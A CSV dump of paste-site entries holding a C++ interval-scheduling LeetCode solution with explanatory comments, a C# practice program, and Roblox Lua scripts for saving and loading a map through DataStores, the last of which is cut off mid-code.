id,title,username,language,date,content
LUjGEwjw,435. Non Overlapping Intervals(IMPORTANT DEDUCTION),Fastrail08,C++,Sunday 27th of July 2025 12:29:58 AM CDT,"//VISIT THIS for more understanding - https://chatgpt.com/share/6885b96b-4234-8012-a95a-7a1075632caf
class Solution {
public:
    //This question can't be solved using LIS version as written below because of the following reason - 
    //AS both axis are dependent on each other
    //end[nextLevel] >= start[currentLevel]
    //The property spans over both the axis simultaneously due to which it is hard to make them independent.
    //INDEPENDENT MEANS - 
    //SORT 1 axis (make it monotonic)
    // USE LIS on other (take different monotonic sequence(here increasing) in AXIS 2, when ordered in ABSOLUTE MONOTONIC ORDER of AXIS 1)
    // but the axis here are dependent on each other

    /*
    -----I----------------I-------------I----- AXIS 1
          I              I             I
           I            I             I
            I          I             I
             I        I             I
    ----------I------I-------------I----------- AXIS 2


    If the diagram looks like this in(non overlapping bridges, russian doll envelopes), we consider it a variation of LIS where we apply LIS on 1 axis when BOTH the AXIS are in SORTED IN MONOTONIC ORDER of 1 AXIS.

    --------------------------------------------------------------------------------------------
                    [start1]--------------------[end1]
    [s2]--------e[2]                                  [s3]-------------[e3]
                    [s4]----------[e4]                        [s5]-----[e5] [s6]--------------[e6]


    Here both the axis are represented in a single combined axis from [start] ------[end].
    Which means the both the axis are dependent on each other as they are represented in a single axis
    It is what is present in the question such as non overlapping intervals(LC version), projects (cses), weighted scheduling problem[LC]

    here we see a dependency between the axis in the form of a conditional that interleaves both the values such as in Non overlapping intervals question, conditional used => 
    if Current Level included, then jump to a level that satisfies start[nextLevel] >= end[currentLevel]               
    
    [[1,2],[1,3],[2,3],[3,4]] for this test case
    
	LIS VARIATION/AXES INDEPENDENT (Russian doll or Non Overlapping Bridges(GFG))
    The answer would be 4, as all are non overlapping in nature. {[1,2], [1, 3], [2, 3], [3, 4]}
    
    JUMP DP/AXES DEPENDENT(Non Overlapping Intervals(LC), Projects(CSES), Weighted Scheduling Problem(LC))
    The answer would be 3, as 3 are non overlapping in nature {[1,2], [2, 3]. [3, 4]}
    
    Draw Diagram, would be easy to notice.

    */
    int getMaxOverlap(int level, vector<vector<int> > &intervals){
        int maxLength = 0;
        bool flag = false;

        for(int i = level + 1; i < intervals.size(); i++){
            //indicates the loop ran ATLEAST ONCE
            flag = true;
            //LIS condition, ONLY CALL TO LEVELS THAT ARE VALID
            //VALID LEVELS, any nextLevel that follows the property => END[nextLevel] >= END[level]
            if(intervals[i][1] >= intervals[level][1]){
                maxLength = max(maxLength, 1 + getMaxOverlap(i, intervals));
            }
        }
        //if loop didn't run, the value of current valid level never got added as it happens inside loop => 1 + recursive call
        // ADD it EXPLCITLY to the maxLength;
        //return flag == true ? maxLength : maxLength + 1;

        //OR you could simply return the value of current level, i.e. 1
        // AS there were no further levels which were valid relative to the current level, the maxLength of the chain that can be formed from  range[level, intervals.size() - 1], INCLUDING level is 1 (current level itself is chain of length 1) 
        
        return flag == true ? maxLength : 1;
    }

    //LIS VERSION 
    int eraseOverlapIntervals(vector<vector<int>>& intervals) {
        int n = intervals.size();
        //sort the intervals to remove dependency from start, NO NEED TO TRACK START as they always increase
        //START is always increasing, so start[level + 1] >= start[level], which makes OVERLAP of intervals impossible based on START as they are always increasing/of monotonic nature. 
        sort(intervals.begin(), intervals.end());

        //USE LIS on END
        //So for END[level] we need to figure what is maximum increasing sequence when ORDERED in INCREASING ORDER of start times.
        //IMPORTANT
        // 2 AXIS where both AXIS work INDEPENDENTLY

        // WE SORT THE FIRST AXIS (introduces monotonicity in that axis, ALWAYS INCREASING)
        // WE DO LIS on SECOND AXIS (for monotonic first axis, find maximum length in 2nd AXIS)
        int maxLength = 0;
        //give every interval the chance to be the first in the sequence
        for(int i = 0; i < n; i++){
            maxLength = max(maxLength, getMaxOverlap(i, intervals));
        }
        return n - maxLength;
    }
};

/*
//BEST APPROACH TO DO IT (JUMP DP QUESTION)
//JUMP DP QUESTIONS ARE THOSE QUESTIONS WHERE AXES ARE DEPENDENT ON EACH OTHER/CONDITIONAL WRITTEN INCLUDES element //FROM BOTH THE AXES. 
//such as start[nextLevel] >= end[currentLevel] 
//THEY ARE DIFFERENT FROM LIS BASED QUESTION, where 1 axis is sorted to make it monotonic and on the other AXIS LIS is //applied.

class Solution {
public:

    //finding the next OPTIMAL start point O(N)
    int findNextLevel(int level, vector<vector<int> > &intervals){
        for(int i = level + 1; i < intervals.size(); i++){
            //next VALID level is the FIRST/CLOSEST level with property start[nextLevel] >= end[level]
            if(intervals[level][1] <= intervals[i][0]){
                return i;
            }
        }
        //if there is no next valid after current level, return the index = intervals.size(), SIGNIFYING all the intervals have been processed, and it gets CATCHED in the BASE CASE
        return intervals.size();
    }

    //O(log(n)) time to find next valid level
    int findNextLevelBS(int level, vector<vector<int> > &intervals){
        int l = level + 1, r = intervals.size() - 1, idx = intervals.size();
        while(l <= r){
            int mid = (l + r) / 2;
            //if the start[mid] >= end[currentLevel], valid level found, save and search for better
            if(intervals[mid][0] >= intervals[level][1]){
                idx = mid;
                r = mid - 1;
            }
            else{
                l = mid + 1;
            }
        }
        //if bs ran, it would return the MOST OPTIMAL level(A level with interval which has a start JUST LARGER than the end of current level), if it didn't run, it would return intervals.size(), signifying that all the intervals that could be processed are already processed, now we reach base case.
        return idx;
    }

    int getMaxOverlap(int level, vector<vector<int> > &intervals, vector<int> &memo){
        if(level >= intervals.size()){
            return 0;
        }
        if(memo[level] != -1){
            return memo[level];
        }
        int inc = 0, exc = 0;
        //include the current level, increase chain by 1, move to the next VALID level
        int nextLevel = findNextLevelBS(level, intervals);
        inc = 1 + getMaxOverlap(nextLevel, intervals, memo);
        
        //next level is automatically valid if current excluded as start[level + 1] >= start[level]
        exc = getMaxOverlap(level + 1, intervals, memo);

        return memo[level] = max(inc, exc);
    }

    int eraseOverlapIntervals(vector<vector<int>>& intervals) {
        int n = intervals.size();
        sort(intervals.begin(), intervals.end());
        //memo key = memo(level) as it is the ONLY variable that is changing, influencing either the base case or transition logic (here base case), and not derivable
        //memo(level) => range of level{0, 1, 2, 3, 4 .......n} => memo[n]
        vector<int> memo(n, -1);
        //ALTHOUGH we are only jumping to VALID LEVELS, still the complexity of code in worst case would be
        //T.C. = O(N*log(N)) and S.C. = O(N)
        //As there can be at max N levels in wors case(all non overlapping) and at each level log(N) work is done
        //So the total complexity would be total unique states * work at each level
        //N * log(N) 
        return intervals.size() - getMaxOverlap(0, intervals, memo);
    }
};
*/
"
LaxB2GYm,DZ/29/07,dmitryEfremov,C#,Sunday 27th of July 2025 12:26:38 AM CDT,"using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;
using Microsoft.SqlServer.Server;

namespace ConsoleApp1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Temperature temperature = new Temperature();
            temperature.Celsius = -300;
            Console.WriteLine(""Celsius: "" + temperature.Celsius);
            temperature.Celsius = -273;
            Console.WriteLine(""Celsius: "" + temperature.Celsius);

            Console.WriteLine(""Counter: "" + Counter.InstanceCount);
            new Counter();
            Console.WriteLine(""Counter: "" + Counter.InstanceCount);
            new Counter();
            Console.WriteLine(""Counter: "" + Counter.InstanceCount);

            StringList stringList = new StringList(10);
            stringList[0] = ""1"";
            stringList[1] = ""2"";
            Console.WriteLine(""stringList:"" + stringList);
            Console.WriteLine(""stringList[0]:"" + stringList[0]);

            var calculateResult = Calculate(5, 6);
            Console.WriteLine($""X:{calculateResult.x} Y:{calculateResult.y} Distance:{calculateResult.distance}"");

            List<Employee> employees = new List<Employee>();
            employees.Add(new Employee(""Вася"", 5));
            employees.Add(new Employee(""Лёша"", 3));
            employees.Add(new Employee(""Гена"", 10));

            GetResume(employees).ToList().ForEach(resume => Console.WriteLine($""Id:[{resume.Item1}] Name:[{resume.Item2}] ExpYears:[{resume.Item3}]""));

            var eventList = new[]
            {
                new{ EventName = ""ШП"", Date = 3 },
                new{ EventName = ""День рождение"", Date = 50},
                new{ EventName = ""Новый год"", Date = 158}
            };
            eventList.ToList().ForEach(eventItem => Console.WriteLine($""Событие:{eventItem.EventName}, Кол-во дней до события:{eventItem.Date}""));

            var listStatistics = new List<(string ProductName, int Sold, double Price)>();
            listStatistics.Add((""Молоко"", 5, 50));
            listStatistics.Add((""Снежок"", 15, 60));
            // как спроецировать на IEnumerable не понятно
        }

        static (int x, int y, double distance) Calculate(int x, int y)
        {
            return ( x, y, Math.Sqrt(x * x + y * y));
        }

        static IEnumerable<ValueTuple<int,string,int>> GetResume(List<Employee> employees)
        {
            return employees.Select(emp => ValueTuple.Create(emp.Id, emp.Name, emp.ExperienceYears));
        }
    }

    internal class Employee
    {
        private static int _id;

        public int Id;
        public string Name;
        public int ExperienceYears;

        public Employee(string name, int experienceYears)
        {
            _id++;
            Id = _id;
            Name = name;
            ExperienceYears = experienceYears;
        }
    }

    public class Temperature
    {
        private float _celsius;
        public float Celsius
        {
            get { return _celsius; }
            set
            {
                if (value >= -273.15f)
                {
                    _celsius = value;
                }
            }
        }
    }

    public class Counter
    {
        public static int InstanceCount { get; private set; }

        public Counter()
        {
            InstanceCount++;
        }

    }

    public class StringList
    {
        private List<string> list;
        
        public StringList(int count)
        {
            list = new List<string>();
            for (int i = 0; i < count; i++)
            {
                list.Add("""");
            }
        }

        public String this[int index]
        {
            get { return list[index]; }
            set 
            {
                if(index >= 0 && index <= list.Count)
                list[index] = value; 
            }
        }

        public override string ToString()
        {
            return string.Join("", "", list);
        }
    }
}
"
fbqRfH9H,Untitled,fadhil_297,Lua,Saturday 26th of July 2025 10:30:08 PM CDT,"--[[ hi i think this script is works very well 
	bc it never failed to save and load
]]
local DataStoreService = game:GetService(""DataStoreService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local ServerScriptService = game:GetService(""ServerScriptService"")
local Players = game:GetService(""Players"")
local HttpService = game:GetService(""HttpService"")
local remoteload = ReplicatedStorage:WaitForChild(""LoadSign"")

-- Constants
local MAX_DATA_SIZE = 3900000 -- ~3.9MB (slightly under DataStore's 4MB limit)
local MAX_DATASTORES = 1000
local MAX_CHUNKS_PER_STORE = 5
local isMapLoading = false
local saveQueue = {}
local mapFullyLoaded = false

-- Helper functions for data conversion
local function vector3ToTable(vec)
	return {vec.X, vec.Y, vec.Z}
end

local function tableToVector3(tbl)
	return Vector3.new(tbl[1], tbl[2], tbl[3])
end

local function color3ToTable(color)
	return {color.R, color.G, color.B}
end

local function tableToColor3(tbl)
	return Color3.new(tbl[1], tbl[2], tbl[3])
end

local function udim2ToTable(udim)
	return {
		{udim.X.Scale, udim.X.Offset},
		{udim.Y.Scale, udim.Y.Offset}
	}
end

local function tableToUDim2(tbl)
	return UDim2.new(tbl[1][1], tbl[1][2], tbl[2][1], tbl[2][2])
end

local function verifyPartAnchoring()
	local parts = {}
	local unanchoredCount = 0

	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA(""BasePart"") and not obj:IsDescendantOf(game:GetService(""Players"")) then
			table.insert(parts, obj)
		end
	end

	for _, part in ipairs(parts) do
		if not part.Anchored and not part:GetAttribute(""Physics"") and part:GetAttribute(""ShouldBeAnchored"") then
			part.Anchored = true
			unanchoredCount += 1
		end
	end

	if unanchoredCount > 0 then
		print(`-- Fixed {unanchoredCount} unanchored parts`)
	end
end

local function serializeGuiObject(obj)
	if obj:IsA(""TextLabel"") then
		return {
			ClassName = ""TextLabel"",
			Name = obj.Name,
			Text = obj.Text,
			TextColor3 = color3ToTable(obj.TextColor3),
			BackgroundColor3 = color3ToTable(obj.BackgroundColor3),
			TextSize = obj.TextSize,
			Font = obj.Font.Name,
			Position = udim2ToTable(obj.Position),
			Size = udim2ToTable(obj.Size),
			BackgroundTransparency = obj.BackgroundTransparency,
			TextTransparency = obj.TextTransparency,
			TextXAlignment = obj.TextXAlignment.Name,
			TextYAlignment = obj.TextYAlignment.Name,
			TextWrapped = obj.TextWrapped,
			TextScaled = obj.TextScaled,
			BorderSizePixel = obj.BorderSizePixel,
			BorderColor3 = color3ToTable(obj.BorderColor3),
			Visible = obj.Visible,
			Children = {}
		}
	elseif obj:IsA(""Frame"") then
		local frameData = {
			ClassName = ""Frame"",
			Name = obj.Name,
			BackgroundColor3 = color3ToTable(obj.BackgroundColor3),
			Position = udim2ToTable(obj.Position),
			Size = udim2ToTable(obj.Size),
			BackgroundTransparency = obj.BackgroundTransparency,
			BorderSizePixel = obj.BorderSizePixel,
			BorderColor3 = color3ToTable(obj.BorderColor3),
			Visible = obj.Visible,
			Children = {}
		}

		for _, child in ipairs(obj:GetChildren()) do
			local childData = serializeGuiObject(child)
			if childData then
				table.insert(frameData.Children, childData)
			end
		end
		return frameData
	elseif obj:IsA(""ImageLabel"") then
		return {
			ClassName = ""ImageLabel"",
			Name = obj.Name,
			Image = obj.Image,
			ImageColor3 = color3ToTable(obj.ImageColor3),
			BackgroundColor3 = color3ToTable(obj.BackgroundColor3),
			Position = udim2ToTable(obj.Position),
			Size = udim2ToTable(obj.Size),
			BackgroundTransparency = obj.BackgroundTransparency,
			ImageTransparency = obj.ImageTransparency,
			BorderSizePixel = obj.BorderSizePixel,
			BorderColor3 = color3ToTable(obj.BorderColor3),
			ScaleType = obj.ScaleType.Name,
			Visible = obj.Visible,
			Children = {}
		}
	end
	return nil
end

local function serializeSurfaceGui(gui)
	local guiData = {
		ClassName = ""SurfaceGui"",
		Name = gui.Name,
		Face = gui.Face.Name,
		Enabled = gui.Enabled,
		SizingMode = gui.SizingMode.Name,
		PixelsPerStud = gui.PixelsPerStud,
		Children = {}
	}

	for _, child in ipairs(gui:GetChildren()) do
		local childData = serializeGuiObject(child)
		if childData then
			table.insert(guiData.Children, childData)
		end
	end
	return guiData
end

local function serializeChildInstance(child)
	if child:IsA(""Decal"") then
		return {
			ClassName = ""Decal"",
			Name = child.Name,
			Texture = child.Texture,
			Transparency = child.Transparency,
			Face = child.Face.Name
		}
	elseif child:IsA(""PointLight"") then
		return {
			ClassName = ""PointLight"",
			Name = child.Name,
			Brightness = child.Brightness,
			Range = child.Range,
			Color = color3ToTable(child.Color),
			Shadows = child.Shadows,
			Enabled = child.Enabled
		}
	elseif child:IsA(""Fire"") then
		return {
			ClassName = ""Fire"",
			Name = child.Name,
			Heat = child.Heat,
			Size = child.Size,
			Color = color3ToTable(child.Color),
			SecondaryColor = color3ToTable(child.SecondaryColor),
			Enabled = child.Enabled
		}
	elseif child:IsA(""Smoke"") then
		return {
			ClassName = ""Smoke"",
			Name = child.Name,
			Size = child.Size,
			Opacity = child.Opacity,
			Color = color3ToTable(child.Color),
			Enabled = child.Enabled
		}
	elseif child:IsA(""SurfaceGui"") then
		return serializeSurfaceGui(child)
	elseif child:IsA(""Texture"") then
		return {
			ClassName = ""Texture"",
			Name = child.Name,
			Texture = child.Texture,
			Transparency = child.Transparency,
			Face = child.Face.Name,
			StudsPerTileU = child.StudsPerTileU,
			StudsPerTileV = child.StudsPerTileV
		}
	end
	return nil
end

local function splitDataIntoChunks(data)
	local chunks = {}
	local chunkIndex = 1
	local currentChunk = {}
	local currentSize = 0

	for i, part in ipairs(data) do
		local partData = HttpService:JSONEncode(part)
		local partSize = #partData

		if partSize > MAX_DATA_SIZE then
			warn(`Part {i} ({part.Name}) is too large ({partSize} bytes) - skipped!`)
			continue
		end

		if currentSize + partSize > MAX_DATA_SIZE then
			chunks[chunkIndex] = currentChunk
			chunkIndex += 1
			currentChunk = {}
			currentSize = 0
		end

		table.insert(currentChunk, part)
		currentSize += partSize
	end

	if #currentChunk > 0 then
		chunks[chunkIndex] = currentChunk
	end

	print(`Split data into {chunkIndex} chunks`)
	return chunks, chunkIndex
end

local function saveGlobalMap()

	-- Check if the game is running in a private or VIP server
	if game.PrivateServerId ~= """" then
		print(""This is a private or VIP server. Skipping map saving."")
		return
	end

	-- Any other code you want to run when it's NOT a private/VIP server
	print(""This is not a private/VIP server. Continuing with the script..."")
	if isMapLoading then
		warn(""-- Map save requested while loading. Queued."")
		table.insert(saveQueue, true)
		return false
	end

	print(""-- Starting map save..."")
	local buildParts = {}

	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA(""BasePart"") and not obj:IsDescendantOf(Players) then
			local partData = {
				ClassName = obj.ClassName,
				Name = obj.Name,
				Position = vector3ToTable(obj.Position),
				Size = vector3ToTable(obj.Size),
				Color = color3ToTable(obj.Color),
				Orientation = vector3ToTable(obj.Orientation),
				Anchored = obj.Anchored,
				Transparency = obj.Transparency,
				Material = obj.Material.Name,
				CanCollide = obj.CanCollide,
				Reflectance = obj.Reflectance,
				Locked = obj.Locked,
				TopSurface = obj.TopSurface.Name,
				BottomSurface = obj.BottomSurface.Name,
				LeftSurface = obj.LeftSurface.Name,
				RightSurface = obj.RightSurface.Name,
				FrontSurface = obj.FrontSurface.Name,
				BackSurface = obj.BackSurface.Name,
				Shape = obj:IsA(""Part"") and obj.Shape.Name or nil,
				Children = {},
			}

			for _, child in ipairs(obj:GetChildren()) do
				local childData = serializeChildInstance(child)
				if childData then
					table.insert(partData.Children, childData)
				end
			end

			table.insert(buildParts, partData)
		end
	end

	local chunks, totalChunks = splitDataIntoChunks(buildParts)
	local mapMetadata = {
		totalChunks = totalChunks,
		lastSaveTime = os.time(),
		version = 2
	}

	-- Save metadata
	local metadataStore = DataStoreService:GetDataStore(""GlobalMapStore_Meta"")
	local success, err = pcall(function()
		metadataStore:SetAsync(""MapMetadata"", mapMetadata)
	end)

	if not success then
		warn(`Metadata save failed: {err}`)
		return false
	end

	-- Save chunks
	local chunksSaved = 0
	local storeIndex = 1

	while storeIndex <= MAX_DATASTORES and chunksSaved < totalChunks do
		local store = DataStoreService:GetDataStore(""GlobalMapStore"" .. storeIndex)
		local maxThisStore = math.min(MAX_CHUNKS_PER_STORE, totalChunks - chunksSaved)

		for i = 1, maxThisStore do
			local globalChunkIndex = chunksSaved + 1
			local chunkKey = ""GlobalMap_Chunk"" .. globalChunkIndex

			local success, err = pcall(function()
				store:SetAsync(chunkKey, chunks[globalChunkIndex])
			end)

			if success then
				print(`Saved chunk {globalChunkIndex} to store {storeIndex}`)
				chunksSaved += 1
			else
				warn(`Failed to save chunk {globalChunkIndex}: {err}`)
			end
		end

		storeIndex += 1
	end

	if chunksSaved == totalChunks then
		print(`Map saved successfully across {storeIndex} stores with {totalChunks} chunks`)
		return true
	else
		warn(`Failed to save all chunks. Saved {chunksSaved}/{totalChunks}`)
		return false
	end
end

local function createGuiObjects(parent, children)
	for _, childData in ipairs(children or {}) do
		local childInstance = Instance.new(childData.ClassName)
		childInstance.Name = childData.Name

		if childInstance:IsA(""TextLabel"") then
			childInstance.Text = childData.Text
			childInstance.TextColor3 = tableToColor3(childData.TextColor3)
			childInstance.BackgroundColor3 = tableToColor3(childData.BackgroundColor3)
			childInstance.TextSize = childData.TextSize
			childInstance.Font = Enum.Font[childData.Font]
			childInstance.Position = tableToUDim2(childData.Position)
			childInstance.Size = tableToUDim2(childData.Size)
			childInstance.BackgroundTransparency = childData.BackgroundTransparency
			childInstance.TextTransparency = childData.TextTransparency
			childInstance.TextXAlignment = Enum.TextXAlignment[childData.TextXAlignment]
			childInstance.TextYAlignment = Enum.TextYAlignment[childData.TextYAlignment]
			childInstance.TextWrapped = childData.TextWrapped
			childInstance.TextScaled = childData.TextScaled
			childInstance.BorderSizePixel = childData.BorderSizePixel
			childInstance.BorderColor3 = tableToColor3(childData.BorderColor3)
			childInstance.Visible = childData.Visible
		elseif childInstance:IsA(""Frame"") then
			childInstance.BackgroundColor3 = tableToColor3(childData.BackgroundColor3)
			childInstance.Position = tableToUDim2(childData.Position)
			childInstance.Size = tableToUDim2(childData.Size)
			childInstance.BackgroundTransparency = childData.BackgroundTransparency
			childInstance.BorderSizePixel = childData.BorderSizePixel
			childInstance.BorderColor3 = tableToColor3(childData.BorderColor3)
			childInstance.Visible = childData.Visible
			createGuiObjects(childInstance, childData.Children)
		elseif childInstance:IsA(""ImageLabel"") then
			childInstance.Image = childData.Image
			childInstance.ImageColor3 = tableToColor3(childData.ImageColor3)
			childInstance.BackgroundColor3 = tableToColor3(childData.BackgroundColor3)
			childInstance.Position = tableToUDim2(childData.Position)
			childInstance.Size = tableToUDim2(childData.Size)
			childInstance.BackgroundTransparency = childData.BackgroundTransparency
			childInstance.ImageTransparency = childData.ImageTransparency
			childInstance.BorderSizePixel = childData.BorderSizePixel
			childInstance.BorderColor3 = tableToColor3(childData.BorderColor3)
			childInstance.ScaleType = Enum.ScaleType[childData.ScaleType]
			childInstance.Visible = childData.Visible
		end

		childInstance.Parent = parent
	end
end

local function loadGlobalMap()
	print(""-- Loading map..."")
	isMapLoading = true
	mapFullyLoaded = false
	saveQueue = {}

	local metadataStore = DataStoreService:GetDataStore(""GlobalMapStore_Meta"")
	local success, mapMetadata = pcall(function()
		return metadataStore:GetAsync(""MapMetadata"")
	end)

	if not success or not mapMetadata then
		warn(""-- No metadata found. Trying legacy load..."")
		local legacyStore = DataStoreService:GetDataStore(""GlobalMapStore"")
		local success, data = pcall(function()
			return legacyStore:GetAsync(""GlobalMap_All"")
		end)

		if success and data then
			print(""-- Legacy map loaded"")
			createPartsFromData(data)
			isMapLoading = false
			mapFullyLoaded = true
			saveGlobalMap()
			return true
		else
			warn(""-- No map data found. Creating new map..."")
			isMapLoading = false
			mapFullyLoaded = true
			saveGlobalMap()
			return false
		end
	end

	print(`-- Loading {mapMetadata.totalChunks} chunks from metadata v{mapMetadata.version}`)

	local allParts = {}
	local chunksLoaded = 0
	local storeIndex = 1

	while storeIndex <= MAX_DATASTORES and chunksLoaded < mapMetadata.totalChunks do
		local store = DataStoreService:GetDataStore(""GlobalMapStore"" .. storeIndex)
		local maxThisStore = math.min(MAX_CHUNKS_PER_STORE, mapMetadata.totalChunks - chunksLoaded)

		for i = 1, maxThisStore do
			local globalChunkIndex = chunksLoaded + 1
			local chunkKey = ""GlobalMap_Chunk"" .. globalChunkIndex

			local success, chunkData = pcall(function()
				return store:GetAsync(chunkKey)
			end)

			if success and chunkData then
				print(`Loaded chunk {globalChunkIndex} from store {storeIndex}`)
				for _, part in ipairs(chunkData) do
					table.insert(allParts, part)
				end
				chunksLoaded += 1
			else
				warn(`Failed to load chunk {globalChunkIndex} from store {storeIndex}`)
			end
		end

		storeIndex += 1
	end

	if chunksLoaded == mapMetadata.totalChunks then
		print(`All {chunksLoaded} chunks loaded successfully`)
		createPartsFromData(allParts)
		task.delay(2, verifyPartAnchoring)
		isMapLoading = false
		mapFullyLoaded = true

		if #saveQueue > 0 then
			print(`Processing {#saveQueue} queued saves`)
			saveGlobalMap()
			saveQueue = {}
		end
		return true
	else
		warn(`Loaded {chunksLoaded}/{mapMetadata.totalChunks} chunks`)
		isMapLoading = false
		return false
	end
end

function createPartsFromData(partData)
	print(`-- Creating {#partData} parts...`)
	local createdParts = {}
	local failed = 0

	for i, part in ipairs(partData) do
		local success, err = pcall(function()
			local newPart = Instance.new(part.ClassName)
			newPart.Name = part.Name
			newPart:SetAttribute(""ShouldBeAnchored"", part.Anchored)

			newPart.Position = tableToVector3(part.Position)
			newPart.Size = tableToVector3(part.Size)
			newPart.Color = tableToColor3(part.Color)
			newPart.Orientation = tableToVector3(part.Orientation)
			newPart.Transparency = part.Transparency
			newPart.Material = Enum.Material[part.Material]
			newPart.CanCollide = part.CanCollide
			newPart.Reflectance = part.Reflectance
			newPart.Locked = part.Locked

			pcall(function()
				newPart.TopSurface = Enum.SurfaceType[part.TopSurface]
				newPart.BottomSurface = Enum.SurfaceType[part.BottomSurface]
				newPart.LeftSurface = Enum.SurfaceType[part.LeftSurface]
				newPart.RightSurface = Enum.SurfaceType[part.RightSurface]
				newPart.FrontSurface = Enum.SurfaceType[part.FrontSurface]
				newPart.BackSurface = Enum.SurfaceType[part.BackSurface]
			end)

			if part.Shape and newPart:IsA(""Part"") then
				pcall(function()
					newPart.Shape = Enum.PartType[part.Shape]
				end)
			end

			newPart.Anchored = part.Anchored
			newPart.Parent = workspace
			table.insert(createdParts, newPart)

			-- Handle non-GUI children
			local hasGui = false
			for _, childData in ipairs(part.Children or {}) do
				if childData.ClassName == ""SurfaceGui"" then
					hasGui = true
				else
					pcall(function()
						local child = Instance.new(childData.ClassName)
						child.Name = childData.Name

						if child:IsA(""Decal"") then
							child.Texture = childData.Texture
							child.Transparency = childData.Transparency
							child.Face = Enum.NormalId[childData.Face]
						elseif child:IsA(""Fire"") then
							child.Heat = childData.Heat
							child.Size = childData.Size
							child.Color = tableToColor3(childData.Color)
							child.SecondaryColor = tableToColor3(childData.SecondaryColor)
							child.Enabled = childData.Enabled
						elseif child:IsA(""Smoke"") then
							child.Size = childData.Size
							child.Opacity = childData.Opacity
							child.Color = tableToColor3(childData.Color)
							child.Enabled = childData.Enabled
						elseif child:IsA(""PointLight"") then
							child.Brightness = childData.Brightness
							child.Range = childData.Range
							child.Color = tableToColor3(childData.Color)
							child.Shadows = childData.Shadows
							child.Enabled = childData.Enabled
						elseif child:IsA(""Texture"") then
							child.Texture = childData.Texture
							child.Transparency = childData.Transparency
							child.Face = Enum.NormalId[childData.Face]
							child.StudsPerTileU = childData.StudsPerTileU
							child.StudsPerTileV = childData.StudsPerTileV
						end

						child.Parent = newPart
					end)
				end
			end

			-- Handle GUI children
			if hasGui then
				for _, childData in ipairs(part.Children or {}) do
					if childData.ClassName == ""SurfaceGui"" then
						pcall(function()
							local gui = Instance.new(""SurfaceGui"")
							gui.Name = childData.Name
							gui.Face = Enum.NormalId[childData.Face]
							gui.Enabled = childData.Enabled
							gui.SizingMode = Enum.SurfaceGuiSizingMode[childData.SizingMode]
							gui.PixelsPerStud = childData.PixelsPerStud
							gui.Parent = newPart
							createGuiObjects(gui, childData.Children)
						end)
					end
				end
			end

			if i % 50 == 0 then
				task.wait()
			end
		end)

		if not success then
			failed += 1
			warn(`Failed part {i}: {err}`)
		end
	end

	print(`Created {#partData - failed}/{#partData} parts`)

	task.spawn(function()
		task.wait(1)
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA(""BasePart"") and not part:IsDescendantOf(Players) then
				part.CastShadow = false

				if part.Anchored == false and part:GetAttribute(""ShouldBeAnchored"") == true then
					for _, createdPart in ipairs(createdParts) do
						if createdPart == part then
							part.Anchored = true
							break
						end
					end
				end
			end
		end
	end)
end

local function setupCommandSystem()
	local Commands = {}

	Commands.savemap = function(player)
		if player.UserId == game.CreatorId or player:GetRankInGroup(game.CreatorId) >= 255 then
			print(`Map save requested by {player.Name}`)
			local success = saveGlobalMap()

			pcall(function()
				player.PlayerGui:SetCore(""ChatMakeSystemMessage"", {
					Text = success and ""Map saved!"" or ""Save failed"",
					Color = success and Color3.new(0, 1, 0) or Color3.new(1, 0, 0),
					Font = Enum.Font.SourceSansBold
				})
			end)
			return true
		else
			pcall(function()
				player.PlayerGui:SetCore(""ChatMakeSystemMessage"", {
					Text = ""No permission"",
					Color = Color3.new(1, 0, 0),
					Font = Enum.Font.SourceSansBold
				})
			end)
			return false
		end
	end

	local function onPlayerChatted(player, message)
		local split = string.split(message, "" "")
		local command = string.lower(split[1])

		if string.sub(command, 1, 1) == ""/"" then
			command = string.sub(command, 2)
			if Commands[command] then
				Commands[command](player, split)
			end
		end
	end

	local success, textChatService = pcall(function()
		return game:GetService(""TextChatService"")
	end)

	if success and textChatService then
		textChatService.MessageReceived:Connect(function(msg)
			local player = Players:FindFirstChild(msg.TextSource.Name)
			if player then
				onPlayerChatted(player, msg.Text)
			end
		end)
	else
		local chatEvents = ReplicatedStorage:FindFirstChild(""DefaultChatSystemChatEvents"")
		if chatEvents and chatEvents:FindFirstChild(""OnMessageDoneFiltering"") then
			chatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
				local player = Players:FindFirstChild(data.FromSpeaker)
				if player then
					onPlayerChatted(player, data.Message)
				end
			end)
		else
			Players.PlayerAdded:Connect(function(player)
				pcall(function()
					player.Chatted:Connect(function(msg)
						onPlayerChatted(player, msg)
					end)
				end)
			end)

			for _, player in ipairs(Players:GetPlayers()) do
				pcall(function()
					player.Chatted:Connect(function(msg)
						onPlayerChatted(player, msg)
					end)
				end)
			end
		end
	end
end

game:BindToClose(function()
	print(""Saving on shutdown..."")
	if not isMapLoading and mapFullyLoaded then
		saveGlobalMap()
	else
		warn(""Skipping save: Map not fully loaded"")
	end
end)

local function setupAutoSave()
	local AUTO_SAVE_INTERVAL = 900 -- 15 minutes

	while true do
		task.wait(AUTO_SAVE_INTERVAL)

		if not isMapLoading and mapFullyLoaded then
			print(""Auto-saving map..."")
			saveGlobalMap()
		else
			warn(""Auto-save skipped: Map busy"")
			table.insert(saveQueue, true)
		end
	end
end

local function initialize()
	print(""Initializing map system..."")
	task.spawn(function()
		local success = loadGlobalMap()
		print(success and ""Map loaded!"" or ""Load failed"")
		remoteload:FireAllClients()
	end)

	setupCommandSystem()
	task.spawn(setupAutoSave)
	print(""Map system initialized!"")
end

Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(message)
		if message == ""/savemap"" then
			saveGlobalMap()
		end
	end)
end)

Players.PlayerAdded:Connect(function(plr)
	if isMapLoading == false then
		remoteload:FireClient(plr)
	end
end)



initialize()"
7tTm9rhn,Autosave Recovery Map,fadhil_297,Lua,Saturday 26th of July 2025 10:27:43 PM CDT,"--[[
    Change the time for the last time the map existed. Use GMT 0 to 
]]
local time = DateTime.fromUniversalTime(2025, 7, 26, 3, 36)
local DataStoreService = game:GetService(""DataStoreService"")

-- Helper function to safely disable the autosave script
local function disableAutosave()
	local autosaveFolder = game:GetService(""ServerScriptService"")[""april 13""]
